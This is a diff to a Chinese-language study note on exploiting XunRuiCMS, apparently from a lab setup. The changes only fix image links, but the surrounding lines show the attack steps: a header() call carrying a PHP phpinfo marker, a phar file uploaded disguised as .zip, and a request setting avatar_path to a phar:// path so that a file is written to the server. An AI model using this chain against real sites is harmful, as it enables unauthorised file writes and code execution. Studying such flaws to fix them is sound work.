@@ -138,11 +138,11 @@ header("Content-Type: application/json <?php phpinfo();?>");
 ```
 
 然后找到文章的附件上传处
-![[Pasted image 20240804230432.png]]
+![[Pasted image 20240804230432.png](../资源文件/图片/Pasted-image-20240804230432.png)]
 
 上传``phar.phar``改后缀为``.zip``
 可以在这边查看路径，文件名称
-![[Pasted image 20240804231218.png]]
+![[Pasted image 20240804231218.png](../资源文件/图片/Pasted-image-20240804231218.png)]
 
 然后在另开一个页面
 ```
@@ -150,6 +150,8 @@ http://xunruicms-study:8009/admin.php?c=api&m=test_avatar_domain
 
 image[avatar_path]=phar://./uploadfile/202408/37738d115ba9223.zip
 ```
-![[Pasted image 20240804231519.png]]
+
+![[Pasted image 20240804231519.png](../资源文件/图片/Pasted-image-20240804231519.png)]
 即可在指定目录生成文件
-![[Pasted image 20240804231609.png]]
+
+![[123.png](../资源文件/图片/123.png)
